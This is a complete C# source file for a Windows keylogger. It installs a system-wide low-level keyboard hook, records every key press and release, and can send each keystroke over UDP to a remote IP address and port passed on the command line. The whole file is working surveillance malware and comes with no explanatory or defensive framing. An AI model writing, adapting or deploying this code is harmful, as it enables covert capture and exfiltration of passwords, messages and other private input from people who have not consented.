using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

static class Program
{
    public static void Main(string[] args)
    {
        IPEndPoint ip = null;
        if (args.Length >= 2)
        {
            ip = new IPEndPoint(IPAddress.Parse(args[0]), int.Parse(args[1]));
        }

        using (var keylogger = new Keylogger())
        using (UdpClient client = new UdpClient())
        {
            keylogger.KeyEvent += (sender, type, key) =>
            {
                string line = (type == KeyboardEventType.KeyDown ? "KEY_DOWN: " : "KEY_UP:   ") + key + "\n";
                if (ip != null)
                {
                    byte[] bytes = Encoding.ASCII.GetBytes(line);
                    client.Send(bytes, bytes.Length, ip);
                }
                Console.Write(line);
            };
            Application.Run();
        }
    }
}

delegate void KeyboardEventHandler<TSender>(TSender sender, KeyboardEventType type, Keys key);

enum KeyboardEventType { KeyDown, KeyUp };

class Keylogger : IDisposable
{
    public Keylogger()
    {
        using (Process currentProcess = Process.GetCurrentProcess())
        using (ProcessModule currentModule = currentProcess.MainModule)
        {
            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, OnKeyboard, GetModuleHandle(currentModule.ModuleName), 0);
        }
    }

    public event KeyboardEventHandler<Keylogger> KeyEvent;

    private IntPtr _hookID = IntPtr.Zero;

    private IntPtr OnKeyboard(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_KEYUP))
        {
            KeyboardEventType type = wParam == (IntPtr)WM_KEYDOWN ? KeyboardEventType.KeyDown : KeyboardEventType.KeyUp;
            Keys key = (Keys)Marshal.ReadInt32(lParam);
            this.KeyEvent?.Invoke(this, type, key);
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    public void Dispose()
    {
        UnhookWindowsHookEx(_hookID);
    }

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_KEYUP = 0x0101;

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
